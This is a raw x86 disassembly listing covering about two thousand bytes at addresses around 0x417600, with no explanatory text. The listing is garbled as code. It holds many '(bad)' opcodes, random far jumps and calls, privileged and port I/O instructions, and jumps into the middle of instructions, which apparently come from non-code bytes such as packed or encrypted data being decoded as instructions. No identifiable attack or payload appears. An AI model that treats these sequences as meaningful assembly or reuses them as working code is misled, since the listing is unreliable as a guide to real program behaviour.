  4175f7:	inc    esi
  4175f8:	add    eax,0xe6e662c
  4175fd:	adc    ecx,edi
  4175ff:	in     eax,0x2f
  417601:	mov    dh,0x46
  417603:	cmp    dl,cl
  417605:	stos   BYTE PTR es:[edi],al
  417606:	fadd   QWORD PTR [edi-0x3c915edc]
  41760c:	call   0x33fa1fa0
  417611:	xor    eax,edx
  417613:	mov    WORD PTR [ebx+ecx*8+0x3027636e],?
  41761a:	mov    al,ds:0x39c29c76
  41761f:	xor    eax,0x45fec778
  417624:	in     al,0x9
  417626:	mov    ds:0x7270d103,al
  41762b:	pusha  
  41762c:	xchg   ecx,eax
  41762d:	(bad)  
  41762e:	loope  0x417683
  417630:	mov    edx,0xc12d9c5d
  417635:	call   0xa01a:0xdd69716c
  41763c:	in     al,dx
  41763d:	rol    DWORD PTR [ebp*1-0x42fae62f],0xf6
  417645:	cld    
  417646:	and    eax,0xe747209f
  41764b:	or     dl,0x7d
  41764e:	xchg   esi,eax
  41764f:	xchg   edi,eax
  417650:	test   eax,0xb2f5ae5b
  417655:	leave  
  417656:	mov    esi,DWORD PTR [ebx+0x33]
  417659:	pushf  
  41765a:	sub    eax,0x2bbd1bd8
  41765f:	inc    ebp
  417660:	pop    edx
  417661:	in     eax,dx
  417662:	out    dx,eax
  417663:	bound  ecx,QWORD PTR [edi+ebp*4+0xe]
  417667:	ins    DWORD PTR es:[edi],dx
  417668:	mov    esp,0x471f98d0
  41766d:	lar    ebx,WORD PTR [edx+0x7dfb659a]
  417674:	lea    edi,[edi]
  417676:	ins    BYTE PTR es:[edi],dx
  417677:	dec    ecx
  417678:	xchg   esp,eax
  417679:	inc    edx
  41767a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41767b:	pusha  
  41767c:	cmp    dh,0xaa
  41767f:	and    eax,0x4d13e28b
  417684:	int    0xaf
  417686:	js     0x4176b2
  417688:	sar    ecx,0x6c
  41768b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41768c:	inc    edi
  41768d:	(bad)  
  41768e:	out    0x7a,al
  417690:	jae    0x41767e
  417692:	ror    ch,0x61
  417695:	or     dh,ah
  417697:	sub    BYTE PTR [edi],dh
  417699:	nop
  41769a:	data16 xor al,0xef
  41769d:	je     0x417649
  41769f:	sbb    eax,edx
  4176a1:	ins    BYTE PTR es:[edi],dx
  4176a2:	iret   
  4176a3:	jmp    0x417693
  4176a5:	push   es
  4176a6:	cmp    DWORD PTR [edi],0x1710dbd2
  4176ac:	mov    ah,0x7a
  4176ae:	jl     0x41763b
  4176b0:	adc    ecx,DWORD PTR [ebx+0x3a]
  4176b3:	loopne 0x417666
  4176b5:	or     BYTE PTR [eax+0x54],al
  4176b8:	test   al,0x80
  4176ba:	sbb    BYTE PTR [ecx+0x9338a92],ah
  4176c0:	fsubr  QWORD PTR [ebx+0xe4c1f2d]
  4176c6:	fwait
  4176c7:	pop    edi
  4176c8:	add    al,0x78
  4176ca:	add    al,0x98
  4176cc:	scas   eax,DWORD PTR es:[edi]
  4176cd:	(bad)  
  4176ce:	and    eax,esp
  4176d0:	xor    al,0x6a
  4176d2:	aad    0x53
  4176d4:	pop    ds
  4176d5:	je     0x41772e
  4176d7:	add    cl,bl
  4176d9:	add    al,0x4c
  4176db:	xchg   DWORD PTR [ebx+ebp*2-0x5f00a66],esp
  4176e2:	leave  
  4176e3:	fld    QWORD PTR [esi]
  4176e5:	retf   0x5693
  4176e8:	icebp  
  4176e9:	pushf  
  4176ea:	xchg   esp,eax
  4176eb:	(bad)  
  4176ec:	addr16 jmp 0x7b6f:0x9badeaac
  4176f4:	mov    ebp,0xcce8ac23
  4176f9:	mov    ebp,0x5fcb8012
  4176fe:	jp     0x417735
  417700:	hlt    
  417701:	xor    DWORD PTR [edx-0x75],eax
  417704:	jb     0x41770c
  417706:	or     al,0x81
  417708:	ja     0x417781
  41770a:	test   BYTE PTR cs:[edx-0x44],cl
  41770e:	inc    ebx
  41770f:	fwait
  417710:	sub    al,0x31
  417712:	pop    ecx
  417713:	in     eax,dx
  417714:	stos   BYTE PTR es:[edi],al
  417715:	mov    WORD PTR [eax],?
  417717:	(bad)  
  417719:	push   es
  41771a:	(bad)  
  41771b:	(bad)  
  41771c:	fadd   st(5),st
  41771e:	jmp    0xcd2f:0x737bfd4
  417725:	mov    ebx,cs
  417727:	lock sub DWORD PTR [edi-0x73],edx
  41772b:	push   cs
  41772c:	and    ax,0x94ed
  417730:	and    eax,0xd5a0d062
  417735:	out    dx,eax
  417736:	xor    al,BYTE PTR [edi]
  417738:	jg     0x41776d
  41773a:	sbb    DWORD PTR [ebp-0x2d],ecx
  41773d:	mov    edi,0x95088599
  417742:	je     0x4176fd
  417744:	mov    cl,dl
  417746:	lock js 0x4176ff
  417749:	mov    eax,0x39167ec5
  41774e:	ja     0x417774
  417750:	out    dx,eax
  417751:	mov    bh,0xd7
  417753:	mov    ah,0x28
  417755:	cmp    al,0xb6
  417757:	shl    BYTE PTR [ecx+ebp*2],0x45
  41775b:	arpl   WORD PTR [ecx+0x666cc29c],bp
  417761:	js     0x41770a
  417763:	out    dx,eax
  417764:	sub    al,0xc9
  417766:	mov    dl,0x47
  417768:	stos   DWORD PTR es:[edi],eax
  417769:	out    dx,al
  41776a:	pop    eax
  41776b:	das    
  41776c:	jo     0x417707
  41776e:	mov    ah,0x2
  417770:	jno    0x41776c
  417772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417773:	xchg   ecx,eax
  417774:	int3   
  417775:	lahf   
  417776:	pusha  
  417777:	mov    eax,ds:0x74dc510e
  41777c:	test   al,0x86
  41777e:	lods   al,BYTE PTR ds:[esi]
  41777f:	test   BYTE PTR [esi+ebx*1+0x73b89c24],ch
  417786:	cmc    
  417787:	es ret 
  417789:	mov    ds:0x8bc9031b,eax
  41778e:	xchg   ecx,eax
  41778f:	cs sub eax,0xe5526bfd
  417795:	daa    
  417796:	xor    DWORD PTR [ebp+0x1450df31],esp
  41779c:	push   es
  41779d:	or     eax,ebp
  41779f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177a0:	push   ebx
  4177a1:	mov    edx,ebp
  4177a3:	jbe    0x417730
  4177a5:	(bad)  
  4177a7:	les    eax,FWORD PTR [edx+ecx*4+0x7d]
  4177ab:	sub    BYTE PTR [ebx],0x1a
  4177ae:	sbb    dh,al
  4177b0:	nop
  4177b1:	scas   eax,DWORD PTR es:[edi]
  4177b2:	xchg   ecx,eax
  4177b3:	mov    ch,0x79
  4177b5:	neg    DWORD PTR [ebx+0x7cd6e993]
  4177bb:	cli    
  4177bc:	stos   DWORD PTR es:[edi],eax
  4177bd:	dec    esi
  4177be:	mov    esi,0x8157d8d0
  4177c3:	adc    dl,cl
  4177c5:	jnp    0x417786
  4177c7:	jo     0x417838
  4177c9:	jge    0x417764
  4177cb:	xlat   BYTE PTR ds:[ebx]
  4177cc:	addr16 jmp 0xfdfd:0x2083fa00
  4177d4:	inc    ebx
  4177d5:	call   0xc9f7bc06
  4177da:	xchg   edx,eax
  4177db:	mov    ecx,0x62fda4dd
  4177e1:	(bad)  
  4177e3:	pop    ebp
  4177e4:	std    
  4177e5:	sub    cl,BYTE PTR [edi-0xaf44584]
  4177eb:	addr16 out 0x99,eax
  4177ee:	jp     0x41784d
  4177f0:	and    BYTE PTR [edx-0x777e473],cl
  4177f6:	sub    al,0x38
  4177f8:	mov    eax,0x6b632a5
  4177fd:	int3   
  4177fe:	jmp    0x9bd4ceb1
  417803:	mov    ecx,0x39e30066
  417808:	stc    
  417809:	fs push edi
  41780b:	popf   
  41780c:	jnp    0x4177a5
  41780e:	ror    DWORD PTR [eax],cl
  417810:	repnz sbb eax,0x25d2e578
  417816:	push   ss
  417817:	(bad)  
  417818:	and    al,0xa6
  41781a:	jae    0x417895
  41781c:	test   eax,0x5cfb66c8
  417821:	adc    eax,0xe917e377
  417826:	mov    al,0x65
  417828:	repz shl BYTE PTR [edi-0x58],1
  41782c:	mov    ebp,DWORD PTR [ecx-0x50]
  41782f:	fs push es
  417831:	mov    ebp,0xc7ff5185
  417836:	daa    
  417837:	sbb    DWORD PTR [eax-0x5ded992a],esi
  41783d:	mov    eax,ds:0x1944f487
  417842:	mov    BYTE PTR [edx-0x6ebc1a24],0x51
  417849:	(bad)  
  41784a:	pushf  
  41784b:	ss sub eax,0xefc76ff
  417851:	inc    ebx
  417852:	aam    0xdc
  417854:	xchg   edx,eax
  417855:	leave  
  417856:	xchg   edx,eax
  417857:	or     dh,BYTE PTR [edx-0x1b]
  41785a:	int    0xb0
  41785c:	aad    0x74
  41785e:	nop
  41785f:	popf   
  417860:	out    dx,al
  417861:	xor    WORD PTR [ebx-0x14],di
  417865:	jo     0x417863
  417867:	sub    esi,DWORD PTR [esi+0x17]
  41786a:	lahf   
  41786b:	mov    bh,0xeb
  41786d:	adc    ebp,esp
  41786f:	jl     0x417827
  417871:	dec    ecx
  417872:	xor    BYTE PTR es:[ebx],dl
  417875:	loope  0x417820
  417877:	stos   DWORD PTR es:[edi],eax
  417878:	popa   
  417879:	(bad)  
  41787a:	cmp    DWORD PTR [ebx],edx
  41787c:	inc    esi
  41787d:	xor    DWORD PTR [ebx],ecx
  41787f:	scas   al,BYTE PTR es:[edi]
  417880:	div    BYTE PTR [ecx+0x54]
  417883:	add    dh,BYTE PTR [edx+0x558c9a17]
  417889:	test   BYTE PTR [edi-0x5c96c38a],cl
  41788f:	jmp    0x5e84:0x847315fe
  417896:	dec    eax
  417897:	mov    ecx,0xf4e25074
  41789c:	and    BYTE PTR [ebx+0x52c1ed28],al
  4178a2:	retf   0xfa21
  4178a5:	or     eax,0xa5c9dc29
  4178aa:	into   
  4178ab:	jg     0x417840
  4178ad:	mov    esi,0xb59b4120
  4178b2:	ror    BYTE PTR [ebp-0x18],cl
  4178b5:	mov    ebp,0x6763c4ee
  4178ba:	cmp    BYTE PTR [ecx-0x68],bh
  4178bd:	lock sldt WORD PTR [edi]
  4178c1:	pop    esp
  4178c2:	rcl    BYTE PTR [ecx+ebp*4],0x77
  4178c6:	pop    esi
  4178c7:	mov    esp,ebx
  4178c9:	sbb    eax,0xc56fa29
  4178ce:	dec    ebx
  4178cf:	call   0xa86ce819
  4178d4:	je     0x4178e2
  4178d6:	pop    ds
  4178d7:	mov    al,ds:0x11c5e65d
  4178dc:	(bad)  
  4178dd:	mov    eax,ds:0x6c38a681
  4178e2:	push   edx
  4178e3:	test   BYTE PTR [edx],al
  4178e5:	pop    ds
  4178e6:	mov    cl,0x40
  4178e8:	aad    0x65
  4178ea:	pop    edi
  4178eb:	pop    ebx
  4178ec:	popf   
  4178ed:	test   al,0x2a
  4178ef:	jbe    0x4178a9
  4178f1:	sub    ch,BYTE PTR [ebp+esi*1-0x7c4675fc]
  4178f8:	push   ds
  4178f9:	fs push ebx
  4178fb:	xchg   edx,eax
  4178fc:	push   ds
  4178fd:	push   ecx
  4178fe:	aas    
  4178ff:	add    esi,DWORD PTR [edi+0x426766a3]
  417905:	ret    
  417906:	popa   
  417907:	retf   
  417908:	push   edi
  417909:	mov    ebx,0x7bab6d8f
  41790e:	xchg   edi,eax
  41790f:	sub    eax,0xaa89fa1c
  417914:	push   esp
  417915:	bound  edi,QWORD PTR [ebx+0x2b5eb162]
  41791b:	mov    ah,BYTE PTR [ebp-0x72]
  41791e:	imul   ebp,eax,0x6f
  417921:	clc    
  417922:	ret    
  417923:	mov    DWORD PTR [esi-0x41],0x3cafe4ab
  41792a:	int3   
  41792b:	or     ecx,DWORD PTR [ebx-0x2b58a8f9]
  417931:	test   al,0xae
  417933:	icebp  
  417934:	test   eax,0x9c2e0a29
  417939:	cld    
  41793a:	sahf   
  41793b:	stos   DWORD PTR es:[edi],eax
  41793c:	ja     0x4178be
  41793e:	aam    0x75
  417940:	popa   
  417941:	lahf   
  417942:	sbb    edi,DWORD PTR [edi]
  417944:	jge    0x4179b1
  417946:	popf   
  417947:	in     eax,dx
  417948:	sub    al,0xb
  41794a:	sbb    BYTE PTR [esi+0x5c],0x67
  41794e:	xchg   BYTE PTR [edi-0x1f21272d],al
  417954:	pop    ebx
  417955:	pop    eax
  417956:	add    bh,ah
  417958:	(bad)
  41795c:	cdq    
  41795d:	dec    edi
  41795e:	call   0x9022:0xe57fcadd
  417965:	adc    DWORD PTR [esi+0x230b5b45],ebp
  41796b:	gs adc bl,al
  41796e:	jnp    0x4178f9
  417970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417971:	ins    BYTE PTR es:[edi],dx
  417972:	neg    BYTE PTR [ebx+ecx*1-0x6018234d]
  417979:	jecxz  0x417947
  41797b:	fsub   DWORD PTR ds:0xa37e487
  417981:	(bad)  
  417982:	popf   
  417983:	in     al,0x23
  417985:	inc    eax
  417986:	jl     0x4179ba
  417988:	frstor [eax]
  41798a:	jmp    0x6ade:0xfcdaf9a
  417991:	cmp    DWORD PTR ds:0x6fc4405e,eax
  417997:	add    edi,DWORD PTR [ebx+0x5d]
  41799a:	ret    
  41799b:	add    ah,BYTE PTR [ebx+0x33]
  41799e:	sbb    al,ah
  4179a0:	jns    0x41792f
  4179a2:	add    al,0xcb
  4179a4:	ret    
  4179a5:	fisttp WORD PTR [ebp+0x73e1ea76]
  4179ab:	(bad)  
  4179ad:	and    DWORD PTR [ebp+0x751f53ed],esi
  4179b3:	xchg   ebx,eax
  4179b4:	(bad)
  4179b8:	adc    dl,dl
  4179ba:	js     0x4179b9
  4179bc:	ffreep st(5)
  4179be:	sub    eax,0x33507a93
  4179c3:	call   0xd9ea:0xd82ecbed
  4179ca:	loope  0x4179b9
  4179cc:	lea    esp,[ebx+0x66660349]
  4179d2:	xchg   ebx,eax
  4179d3:	loop   0x4179e5
  4179d5:	fisttp WORD PTR [edx-0x5a0e62ca]
  4179db:	clts   
  4179dd:	xor    eax,0xc30dc10a
  4179e2:	dec    edi
  4179e3:	mov    ch,0xeb
  4179e5:	push   eax
  4179e6:	xchg   ebp,eax
  4179e7:	cwde   
  4179e8:	in     eax,0x71
  4179ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179eb:	shl    DWORD PTR [edi+0x178cd7b4],0x41
  4179f2:	push   ss
  4179f3:	pop    ecx
  4179f4:	or     BYTE PTR [edi],bl
  4179f6:	mov    esp,0xdccae155
  4179fb:	jnp    0x41799b
  4179fd:	lahf   
  4179fe:	inc    esi
  4179ff:	aam    0x26
  417a01:	mul    DWORD PTR [edx-0x2c]
  417a04:	xchg   esi,eax
  417a05:	addr16 leave 
  417a07:	outs   dx,DWORD PTR ds:[esi]
  417a08:	inc    edx
  417a09:	cld    
  417a0a:	push   0x83b45d15
  417a0f:	std    
  417a10:	dec    ebx
  417a11:	jne    0x417a46
  417a13:	push   esi
  417a14:	pop    ss
  417a15:	jnp    0x417a43
  417a17:	jg     0x4179e1
  417a19:	pop    ebx
  417a1a:	std    
  417a1b:	cdq    
  417a1c:	jmp    0xc5d1:0x5c728a89
  417a23:	inc    esi
  417a24:	rcr    BYTE PTR [eax+edx*1-0x3d],1
  417a28:	sahf   
  417a29:	mov    al,ds:0x7a1fe395
  417a2e:	les    ecx,FWORD PTR [eax-0x27da282]
  417a34:	jp     0x4179b9
  417a36:	dec    ecx
  417a37:	mov    ah,BYTE PTR [edx-0x5a]
  417a3a:	jmp    0x4179d2
  417a3c:	jbe    0x4179d3
  417a3e:	daa    
  417a3f:	mov    al,ds:0xbd40881a
  417a44:	std    
  417a45:	or     al,BYTE PTR [esi]
  417a47:	jp     0x417a89
  417a49:	rcr    DWORD PTR [ecx+0x106516a8],1
  417a4f:	(bad)  
  417a50:	pop    edi
  417a51:	push   edi
  417a52:	das    
  417a53:	dec    ebp
  417a54:	jmp    0x5c51:0xff60d9e9
  417a5b:	or     DWORD PTR [edi-0x4dea4319],0x1c7badf2
  417a65:	cwde   
  417a66:	mov    DWORD PTR [eax],esi
  417a68:	cmp    ah,BYTE PTR [ecx-0x251c103d]
  417a6e:	imul   esp,DWORD PTR [ebp-0x19],0x7d364fc3
  417a75:	and    BYTE PTR ds:0x4b848018,dh
  417a7b:	push   ecx
  417a7c:	xchg   edi,eax
  417a7d:	std    
  417a7e:	loop   0x417a0e
  417a80:	xor    eax,0x7622d410
  417a85:	div    DWORD PTR [edi-0x32b3d1b7]
  417a8b:	xchg   ebx,eax
  417a8c:	(bad)  
  417a8d:	mov    cl,0x4e
  417a8f:	push   ds
  417a90:	sbb    eax,0x40e44a7
  417a95:	in     al,0x84
  417a97:	add    DWORD PTR [edx-0x24],edi
  417a9a:	scas   al,BYTE PTR es:[edi]
  417a9b:	ret    0x98ec
  417a9e:	(bad)  
  417a9f:	xchg   esi,eax
  417aa0:	dec    ebp
  417aa1:	mov    eax,ds:0xb3d30e92
  417aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa7:	ror    BYTE PTR [eax-0x51],0x2
  417aab:	mov    bh,0x12
  417aad:	mov    al,0x56
  417aaf:	shl    DWORD PTR [ebx-0x4e],0xf9
  417ab3:	or     bh,BYTE PTR [edi+0x48]
  417ab6:	cmc    
  417ab7:	inc    esp
  417ab8:	ins    BYTE PTR es:[edi],dx
  417ab9:	sub    BYTE PTR [edx-0x38],ah
  417abc:	fcmovnu st,st(6)
  417abe:	dec    ecx
  417abf:	or     al,BYTE PTR [ebx-0x19]
  417ac2:	and    al,0x90
  417ac4:	push   ds
  417ac5:	dec    ebx
  417ac6:	lods   al,BYTE PTR ds:[esi]
  417ac7:	sahf   
  417ac8:	jg     0x417aaf
  417aca:	js     0x417a8f
  417acc:	push   eax
  417acd:	or     al,0xd7
  417acf:	inc    eax
  417ad0:	cmp    al,0xe1
  417ad2:	daa    
  417ad3:	cmp    al,0x35
  417ad5:	sbb    DWORD PTR [esi],ebx
  417ad7:	push   0x15ffa4ca
  417adc:	test   eax,0x9b303c7e
  417ae1:	sbb    eax,0xa53d925a
  417ae6:	pusha  
  417ae7:	add    ah,BYTE PTR [esi]
  417ae9:	pop    ebx
  417aea:	xchg   edi,edx
  417aec:	in     eax,0xa4
  417aee:	ins    DWORD PTR es:[edi],dx
  417aef:	iret   
  417af0:	push   ecx
  417af1:	addr16 es xchg ebp,eax
  417af4:	xor    eax,0x7ccbf864
  417af9:	popf   
  417afa:	sbb    bh,bl
  417afc:	push   esp
  417afd:	retf   0x2bee
  417b00:	cmp    eax,0xad93339f
  417b05:	fisttp DWORD PTR [esi]
  417b07:	scas   al,BYTE PTR es:[edi]
  417b08:	rdmsr  
  417b0a:	pop    ebp
  417b0b:	cmp    BYTE PTR [edi+0x7ae24012],ch
  417b11:	fbstp  TBYTE PTR [ebp-0x1aa59314]
  417b17:	std    
  417b18:	jp     0x417aca
  417b1a:	adc    eax,0x33d03963
  417b1f:	jp     0x417b66
  417b21:	test   eax,0x8e1661e0
  417b26:	inc    ebx
  417b27:	xor    edx,DWORD PTR [edx]
  417b29:	rcl    BYTE PTR [eax],cl
  417b2b:	aaa    
  417b2c:	fs jno 0x417b34
  417b2f:	mov    al,0x63
  417b31:	xchg   esp,eax
  417b32:	aam    0xb
  417b34:	xchg   esp,eax
  417b35:	mov    edi,ebx
  417b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b38:	mov    ebp,0xc63bcfc0
  417b3d:	out    0xd9,al
  417b3f:	cli    
  417b40:	scas   al,BYTE PTR es:[edi]
  417b41:	fild   WORD PTR [edi+ecx*1-0x58]
  417b45:	inc    esp
  417b46:	shl    cl,0xe8
  417b49:	mov    ch,0xc1
  417b4b:	in     al,dx
  417b4c:	add    al,0xc4
  417b4e:	sub    BYTE PTR [edi+0xf],0xcd
  417b52:	psubusw mm0,mm5
  417b55:	jmp    0x417b0f
  417b57:	rcl    DWORD PTR [ebx],cl
  417b59:	imul   BYTE PTR [edi]
  417b5b:	aaa    
  417b5c:	cs int3 
  417b5e:	jmp    0x417b64
  417b60:	in     al,0x35
  417b62:	inc    ecx
  417b63:	ror    DWORD PTR [eax],0x9d
  417b66:	ret    
  417b67:	mov    DWORD PTR [eax],ebp
  417b69:	xor    dh,BYTE PTR [ebx]
  417b6b:	jnp    0x417b51
  417b6d:	aad    0xc4
  417b6f:	or     ah,cl
  417b71:	xor    DWORD PTR [ecx+eiz*8],0x7835948
  417b78:	push   eax
  417b79:	sub    dh,cl
  417b7b:	repz mov esi,0x432fa5e8
  417b81:	dec    ebp
  417b82:	ret    0x18b0
  417b85:	push   eax
  417b86:	jg     0x417ba5
  417b88:	lea    ecx,fs:[ebx+0x18571f28]
  417b8f:	mov    bh,BYTE PTR [esi+0x378255d4]
  417b95:	adc    BYTE PTR [edi+0x78],ah
  417b98:	push   edx
  417b99:	cld    
  417b9a:	sbb    DWORD PTR [edx+0x65],edi
  417b9d:	pop    ss
  417b9e:	mov    esp,0xa149cde7
  417ba3:	inc    edi
  417ba4:	gs imul ebx,edx,0xc966edd5
  417bab:	lds    edx,FWORD PTR [esi]
  417bad:	lahf   
  417bae:	pushf  
  417baf:	in     al,0x47
  417bb1:	adc    al,0xd5
  417bb3:	imul   ecx,DWORD PTR [ebp-0x12],0x94178b0
  417bba:	outs   dx,DWORD PTR ds:[esi]
  417bbb:	lea    esi,ss:[edx-0x1c]
  417bbf:	sbb    DWORD PTR [esi+0x631a63bf],ebx
  417bc5:	jnp    0x417c3b
  417bc7:	cmp    al,bh
  417bc9:	sbb    ebp,DWORD PTR [ebp-0x1a]
  417bcc:	sbb    ecx,DWORD PTR [eax]
  417bce:	push   ebp
  417bcf:	xor    esi,DWORD PTR [esi-0x75]
  417bd2:	mov    dl,0x17
  417bd4:	cli    
  417bd5:	xchg   edi,eax
  417bd6:	mov    DWORD PTR [edi],ebp
  417bd8:	cmp    ebx,eax
  417bda:	pop    edi
  417bdb:	ins    DWORD PTR es:[edi],dx
  417bdc:	(bad)  
  417bdd:	jge    0x417c3c
  417bdf:	mov    ecx,0xde1f9443
  417be4:	dec    ebp
  417be5:	or     dl,bh
  417be7:	sub    bh,BYTE PTR [eax]
  417be9:	sub    cl,ah
  417beb:	test   BYTE PTR [edi-0x5d],bh
  417bee:	popf   
  417bef:	iret   
  417bf0:	dec    edx
  417bf1:	jg     0x417c4a
  417bf3:	mov    bh,0x25
  417bf5:	sbb    ch,BYTE PTR [esi+ebp*4+0x28]
  417bf9:	cmc    
  417bfa:	mov    esp,ebx
  417bfc:	cli    
  417bfd:	lahf   
  417bfe:	and    ah,BYTE PTR [esi+eiz*4]
  417c01:	mov    ds,WORD PTR [esi-0x1]
  417c04:	loope  0x417c3a
  417c06:	leave  
  417c07:	imul   edx,DWORD PTR [edx],0x9e60bbb3
  417c0d:	ds int3 
  417c0f:	(bad)  [edi-0x35e93899]
  417c15:	jle    0x417c24
  417c17:	int    0x4b
  417c19:	pushf  
  417c1a:	jo     0x417c5b
  417c1c:	lahf   
  417c1d:	mov    dh,0x31
  417c1f:	js     0x417c78
  417c21:	call   0x9078:0x765e8208
  417c28:	xor    al,0x7c
  417c2a:	pop    eax
  417c2b:	mov    ebp,0x865f08ce
  417c30:	iret   
  417c31:	xchg   esp,eax
  417c32:	jmp    0x442b1f93
  417c37:	test   edx,edx
  417c39:	jecxz  0x417c00
  417c3b:	jmp    0x78a60525
  417c40:	mov    ecx,0xcd33c045
  417c45:	jb     0x417c18
  417c47:	aam    0x88
  417c49:	jle    0x417bec
  417c4b:	mov    al,0x90
  417c4d:	lods   al,BYTE PTR ds:[esi]
  417c4e:	xchg   ebx,eax
  417c4f:	mov    esp,0x3f0eebb8
  417c54:	imul   esp,DWORD PTR [esi+0x25],0x8602aed2
  417c5b:	sar    BYTE PTR [edx+0x12],cl
  417c5e:	ins    BYTE PTR es:[edi],dx
  417c5f:	loop   0x417c35
  417c61:	push   edx
  417c62:	scas   eax,DWORD PTR es:[edi]
  417c63:	lds    edx,FWORD PTR [edi+esi*8-0x50]
  417c67:	xlat   BYTE PTR ds:[ebx]
  417c68:	and    al,0x97
  417c6a:	(bad)  
  417c6b:	jae    0x417c08
  417c6d:	mov    bh,0x8f
  417c6f:	in     al,0x7b
  417c71:	mov    ch,0xfa
  417c73:	mov    edi,0x74aebc81
  417c78:	fcmovnb st,st(7)
  417c7a:	xchg   edx,eax
  417c7b:	ret    
  417c7c:	mov    ah,0xdd
  417c7e:	out    dx,eax
  417c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c80:	mov    dh,0xee
  417c82:	inc    ebp
  417c83:	jo     0x417cb2
  417c85:	mov    cl,0xdb
  417c87:	(bad)  
  417c88:	not    BYTE PTR [ecx+0x35]
  417c8b:	loopne 0x417c4b
  417c8d:	mov    BYTE PTR [edx],dh
  417c8f:	retf   
  417c90:	retf   0x77fb
  417c93:	or     al,0x42
  417c95:	mov    al,0xc9
  417c97:	or     al,0x8b
  417c99:	scas   eax,DWORD PTR es:[edi]
  417c9a:	ins    BYTE PTR es:[edi],dx
  417c9b:	add    DWORD PTR [ebx+0x42],eax
  417c9e:	stc    
  417c9f:	loopne 0x417cc4
  417ca1:	jl     0x417c8a
  417ca3:	(bad)  
  417ca4:	sub    ecx,DWORD PTR [esi-0x78d3276f]
  417caa:	mov    dh,0x34
  417cac:	sbb    DWORD PTR [edx-0x49f53e49],eax
  417cb2:	mov    dh,0xb6
  417cb4:	sub    BYTE PTR [edi+0x65],dh
  417cb7:	jnp    0x417c74
  417cb9:	adc    al,0xee
  417cbb:	(bad)  
  417cbc:	shl    DWORD PTR [edx+0x2c65ea25],cl
  417cc2:	xor    dh,dl
  417cc4:	retf   
  417cc5:	sub    edi,DWORD PTR [esp+eiz*4-0x59176bf2]
  417ccc:	or     BYTE PTR ds:0xd8e25961,ah
  417cd2:	test   DWORD PTR [esi+0x5e99d8bd],ebx
  417cd8:	(bad)  
  417cd9:	adc    ecx,ebx
  417cdb:	ds neg dh
  417cde:	loopne 0x417d2a
  417ce0:	pmulhuw mm0,QWORD PTR [ebx+ecx*1-0x2d]
  417ce5:	(bad)  
  417ce7:	retf   0x337e
  417cea:	inc    esp
  417ceb:	aaa    
  417cec:	mov    esp,ebx
  417cee:	xor    dh,BYTE PTR [ebx+ebp*2]
  417cf1:	mov    esp,DWORD PTR [edi]
  417cf3:	jg     0x417d16
  417cf5:	jae    0x417c81
  417cf7:	mov    edx,0xfe93ed9f
  417cfc:	adc    eax,esp
  417cfe:	fimul  DWORD PTR [esi]
  417d00:	arpl   WORD PTR [eax-0x7694ef5a],cx
  417d06:	or     BYTE PTR ds:0x9c136769,dl
  417d0c:	mov    ds:0x5fa4797e,eax
  417d11:	and    al,0xa5
  417d13:	xchg   ebx,eax
  417d14:	test   DWORD PTR [ebx+eiz*1],0x81b81c0
  417d1b:	dec    edi
  417d1c:	rol    BYTE PTR [edi+0x35ba3e3b],cl
  417d22:	daa    
  417d23:	mov    DWORD PTR [edi-0x50],esi
  417d26:	xlat   BYTE PTR ds:[ebx]
  417d27:	fisubr DWORD PTR [ecx]
  417d29:	repz jge 0x417d16
  417d2c:	jae    0x417cb4
  417d2e:	fs push ss
  417d30:	pusha  
  417d31:	ficom  WORD PTR [ebx+ebx*8+0x24d56d69]
  417d38:	fdivr  st,st(1)
  417d3a:	imul   eax,DWORD PTR [edi-0x5f18c5a1],0xc53d3282
  417d44:	fsubr  st,st(7)
  417d46:	rol    esi,1
  417d48:	cwde   
  417d49:	mov    edx,0xa858b552
  417d4e:	mov    DWORD PTR [edx],edi
  417d50:	enter  0xd07,0x9b
  417d54:	outs   dx,DWORD PTR ds:[esi]
  417d55:	idiv   BYTE PTR [esi+0x71]
  417d58:	bound  ecx,QWORD PTR [edi+eax*2-0x7f968c25]
  417d5f:	test   eax,0x7ea96261
  417d64:	fs sbb eax,0x51e2ca85
  417d6a:	rol    dh,1
  417d6c:	xchg   edi,eax
  417d6d:	(bad)  
  417d6e:	shl    eax,1
  417d70:	xor    BYTE PTR [eax+0x32],ch
  417d73:	jae    0x417d2a
  417d75:	mov    ds:0x856faf2f,eax
  417d7a:	mov    eax,ds:0x95d9057c
  417d7f:	jb     0x417d95
  417d81:	and    DWORD PTR [eax-0x3750bde6],edi
  417d87:	push   cs
  417d88:	jg     0x417e03
  417d8a:	mov    ebp,0xc72201e3
  417d8f:	adc    esi,DWORD PTR [ebp-0x3e0e2f44]
  417d95:	push   esi
  417d96:	pushf  
  417d97:	add    eax,0x2998778b
  417d9c:	push   ecx
  417d9d:	test   BYTE PTR [esi+0x3cdee245],0x9b
  417da4:	inc    BYTE PTR [ecx]
  417da6:	pop    ds
  417da7:	xchg   cl,dh
  417da9:	mov    cl,0x78
  417dab:	fwait
  417dac:	sar    BYTE PTR [edx],cl
  417dae:	int    0x73
  417db0:	push   es
  417db1:	test   DWORD PTR [ebx+0x5ed180b],esi
  417db7:	xor    dh,BYTE PTR [esi-0x2999c40e]
  417dbd:	cwde   
  417dbe:	test   BYTE PTR [edi+0x5d],0x93
  417dc2:	jge    0x417e1f
  417dc4:	or     cl,ch
  417dc6:	fild   WORD PTR [edi+0x71]
  417dc9:	(bad)
  417dcc:	mov    eax,0xee6ac79e
  417dd1:	or     ecx,eax
  417dd3:	pop    ebp
  417dd4:	xlat   BYTE PTR ds:[ebx]
  417dd5:	rol    bl,cl
  417dd7:	push   eax
  417dd8:	xor    eax,DWORD PTR [ecx+0x6101dd9c]
  417dde:	out    0xff,al
  417de0:	or     bl,BYTE PTR [edx]
  417de2:	les    eax,FWORD PTR [ebx+0x50]
  417de5:	sub    BYTE PTR [ecx+0x6e],ch
  417de8:	pop    ecx
  417de9:	jns    0x417da9
  417deb:	sub    al,0xb6
  417ded:	add    dh,BYTE PTR [edi+0x7b]
  417df0:	dec    eax
  417df1:	(bad)  
